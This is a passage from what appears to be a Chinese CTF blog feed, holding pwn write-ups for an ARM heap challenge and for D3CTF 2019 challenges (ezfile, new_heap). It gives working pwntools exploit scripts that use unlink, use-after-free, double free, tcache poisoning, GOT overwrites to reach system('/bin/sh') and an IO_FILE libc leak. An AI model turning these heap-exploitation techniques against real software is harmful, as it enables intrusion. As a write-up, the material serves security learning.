href="#查看文件-3" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/21.png"></div><p>这个32位的arm题，保护仅开启NX。</p><h2 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>典型的菜单题，漏洞也很明显：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/22.png"></div><p>这里edit的时候有一个控制size的漏洞，那么就可以overflow了。既然这里保护都没开，我们想到一个很久没有使用的技术：unlink</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>unlink向bss中写入bss地址，从而可以控制heap list，写got表地址leak libc，改got表getshell</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>local <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#p = process(["qemu-arm","-g","1234","-L","/home/xiaoxiaorenwu/pwn/2020dwkj/pwnme","./a.out"])</span>    <span class="token comment" spellcheck="true"># p = process(["qemu-arm", "-g", "1234", "-L", "/usr/624-lib", "./a.out"])</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/624-lib"</span><span class="token punctuation">,</span> <span class="token string">"./a.out"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/624-lib/lib/libc.so.0'</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.58.215'</span><span class="token punctuation">,</span><span class="token number">1337</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/624-lib/lib/libc.so.0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Length:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Length:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x2106c</span>  <span class="token comment" spellcheck="true"># 我们想要写入的地址</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ptr<span class="token number">-0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd（0x21060） 写入0x2106c</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2106c</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ARM-PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-D3CTF部分PWN解题</title>
      <link href="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/"/>
      <url>/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>ezfile：利用UAF来修改stdin的fileno为3，然后再栈溢出控制rdi为.flag然后返回到open fd的位置。这个时候将.flag的内容做为名字输入再打印出来。就可以泄露flag了。注意改到stdin位置和栈地址都需要爆破一位（1/16*16）</p><p>new_heap:2.29 double free，利用没有setbuf(stdin)的漏洞，getchar来分配大chunk触发consolidation，来进行overlapping、UAF，io leak libc地址，改hook来getshell</p><p>unprintbleV：关闭了输出流，格式化字符串。两种方法：第一种方法利用格式化字符串改bss中stdout为stderr。第二种方法利用格式化字符串改stdout中fileno为2。leak libc写入one_gadget</p><h1 id="0x01-ezfile"><a href="#0x01-ezfile" class="headerlink" title="0x01 ezfile"></a>0x01 ezfile</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/0.png"></div>首先想到是不是跟栈溢出会有点关系，毕竟 canary没开嘛。<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/1.png"></div><p>前面有些别的操作，比如开沙箱，然后open一个文件。我们看沙箱知道只能读出flag了。<br>继续看功能：</p><p>删除功能：（UAF）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/2.png"></div><p>创建功能：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/3.png"></div><p>加密功能：（栈溢出）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/4.png"></div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这里需要普及一下知识：</p><p>当程序运行：stderr的fileno为0，stdin的fileno是1，stdout的fileno是2。那么再open一个fd，它的fileno就是3.（再分配就继续加一），那么当我们伪造stdin的fileno为3的时候，也就是我们将要打开的文件时，他就会误将这个文件的内容作为输入。</p><p>通过调试我们看到栈溢出数据可以构造来控制rdi寄存器，以及返回地址。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/5.png"></div>在看这里我们可以将ret改到这里，以此来打印出flag。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/6.png"></div>知道这些那么就有思路：先利用UAF来修改stdin的fileno为3，然后再栈溢出控制rdi为.flag然后返回到open fd的位置。这个时候将.flag的内容做为名字输入再打印出来。就可以泄露flag了。注意改到stdin位置和栈地址都需要爆破一位（1/16*16）<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># decode = utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ezfile"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ezfile"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 第一步控制fd来改fileno，这里有个技巧是通过fastbin分配后其它chunk进入tcache的特点来劫持的。</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token string">"\x80"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xa1"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x60\xfa"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 注意这里不能改为0x70，因为最后会导致运行的时候更新tcache链时溢出，破环ebp数据，由于在fastbin是0x60去tcache后会加上头部的0x10</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"aaaa\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 改返回地址和rdi数据</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># O_RDONLY</span><span class="token comment" spellcheck="true"># gdb.attach(sh,"b *0x5555555550c0")</span>payload <span class="token operator">=</span> <span class="token string">'./flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x14c</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># payload = 'flag\0'.ljust(0x68, '\0') + '\x4c\x51'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"b *0x5555555550c0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create(8,p64(3))</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-new-heap"><a href="#0x02-new-heap" class="headerlink" title="0x02 new_heap"></a>0x02 new_heap</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/7.png"></div>libc 2.29<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主程序：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/8.png"></div><p>func函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/9.png"></div>这里看到stdin没有 setbuf，具体原因我们会在后面说明。但是紧接着后面malloc了一个0x1000的chunk。之前做题的第一反应是可以leak libc，但是并不是这样的。。。。后面还输出了这个chunk的倒数第二位值<p>create函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/10.png"></div>第一个条件：size是fastbin的阈值以内。第二：最多18个chunk<p>delete函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/11.png"></div>终于看到漏洞了：Double free。 <p>逻辑非常简单，那么利用思路就会极其复杂，这已经是常态了。</p><p><strong>考察点：在没有生成大于fastbin chunk的条件下，利用malloc_consolidation进行创造出大 chunk。在UAF的条件下控制tcache的头和tcache的链。</strong></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>思路就是：<br>1.先分配出足够多的chunk再删除放到fastbin中，再利用malloc_consolidation进行合并操作 放到unsorted bin之中。<br>2.通过没有关闭缓冲区的漏洞来触发分配大chunk给输出缓冲区。<br>利用这个大chunk分配一个比之前大的chunk修改数据利用UAF，进行overlapping控制list，io file attack来leak libc。<br>再利用输出倒数第二位chunk地址来劫持tcache header（因为再进行tcahe list control的过程中已经弄坏了tcache list了，所以最后 修改hook的时候需要再利用tcache 0x250的header来切除chunk控制list）</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>步骤一：填满tcache并释放两个chunk到fastbin</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/12.png"></div><p>步骤二：利用malloc_consolidation来合并两个chunk，分配之前tcache已经满的size chunk，将这个覆盖了的chunk释放到tcache中，分配0x78的chunk，覆盖掉刚刚 释放再tcache中的chunk的fd数据</p><p>1.利用malloc_consoilidation来合并fastbin中的chunk</p><pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"exit\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"sure?\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"n\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/13.png"></div><p>2.分配一个0x60的chunk，为了将第二个fastbin释放到tcache中，为了后来的覆盖数据来控制tcache list</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/14.png"></div><p>现在tcache中唯一的一个0x2c0的chunk是我们要修改fd的chunk</p><p>3.分配0x80，由于tcache中没有，回到fastbin中找也没有，再到unsorted  bin中找也是空的，所以再smallbin中找到并切分</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x10"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>heap_last_address<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto">{% asset_img 15.png %}</div>fd已经是tcache header的位置了。4.将且完后剩余的0x40的chunk从unsorted bin回到small  bin中去。同时分配出图中那个chunk，修改fd指向stdout。<div style="width:70%;margin:auto">{% asset_img 16.png %}</div>```pythoncreate(0x78,"shinnosuke")create(0x58,p64(0)*3+p64(0x41)+"\x60\x37")```<div style="width:70%;margin:auto">{% asset_img 17.png %}</div>4.删除掉已经修改掉size为0x40的chunk（那么tcache中就有这个chunk的address了，那么再控制tcache header的时候修改0x40的链的chunk地址为下面+0x20的地址，那么刚好就可以构造一个tcache list里面有个地址是stdout的地址，就可以创建到stdout的地址了）这里的难点就是注意要将tcache 0x250的链的number设置为7,这样我们后面在free 0x250的时候就直接进入unsorted bin中了,就可以接下来的切除继续控制list操作```pythondelete(1)create(0x58,p64(0x0000000000020000)+p64(0)*3 + p64(0x7000000) + p64(0)*5+"\xe0"+chr(heap_last_address))```<div style="width:70%;margin:auto">{% asset_img 18.png %}</div><p>修改后:</p><div style="width:70%;margin:auto">{% asset_img 19.png %}</div>5.io_file泄露libc地址```pythoncreate(0x30,"/bin/sh\x00")create(0x30,p64(0xfbad1800)+p64(0)*3+"\x00")p.recv(8)p.recv(8)offset__IO_stdfile_2_lock= 0x1e7570libc.address = u64(p.recv(6).ljust(8,"\x00")) - offset__IO_stdfile_2_lockprint "libc address: ",hex(libc.address)```步骤三:删除这个0x250的chunk进入unsorted bin之中,为什么之前已经讲过. 